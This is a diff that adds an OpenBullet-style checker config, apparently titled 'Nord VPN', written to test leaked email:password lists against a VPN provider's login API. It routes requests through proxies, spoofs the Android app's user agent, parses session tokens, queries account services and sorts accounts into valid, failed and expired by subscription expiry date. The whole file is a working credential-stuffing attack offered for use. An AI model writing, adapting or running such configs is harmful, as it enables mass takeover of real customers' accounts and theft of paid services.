@@ -1,0 +1,60 @@
+[SETTINGS]
+{
+  "Name": "Nord VPN",
+  "SuggestedBots": 100,
+  "LastModified": "2018-12-21T08:04:47.2328991+00:00",
+  "AdditionalInfo": "NEW - FREE KEYCHECK :P",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#LOGIN REQUEST POST "https://zwyr157wwiu6eior.com/v1/users/tokens" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: NordApp android (playstore/2.8.6) Android 8.1.0" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Unauthorized" 
+  KEYCHAIN Retry OR 
+    KEY "502: Bad gateway" 
+#PARSE_TOKEN PARSE "<SOURCE>" LR "\"token\":\"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#ENCODE_TOKEN FUNCTION Base64Encode "token:<TOKEN>" -> VAR "ENCTOKEN" 
+#REQUEST_USER_INFO REQUEST GET "https://zwyr157wwiu6eior.com/v1/users/services" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Basic <ENCTOKEN>" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "created_at" 
+  KEYCHAIN Failure OR 
+    KEY "[]" 
+FUNCTION CurrentUnixTime "" -> VAR "1" 
+FUNCTION UnixTimeToISO8601 "<1>" -> VAR "TS" 
+FUNCTION Substring "0" "10" "<TS>" -> VAR "Substeeee" 
+FUNCTION Replace "-" "" UseRegex=FALSE "<Substeeee>" -> VAR "CC" 
+PARSE "<SOURCE>" LR "\",\"expires_at\":\"" " " Recursive=FALSE -> VAR "exp" "" "" 
+FUNCTION Replace "-" "" UseRegex=FALSE "<exp>" -> VAR "reeee" 
+FUNCTION Constant "<exp>" -> CAP "EXPIRATION" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "<reeee>" LessThan "<CC>" 
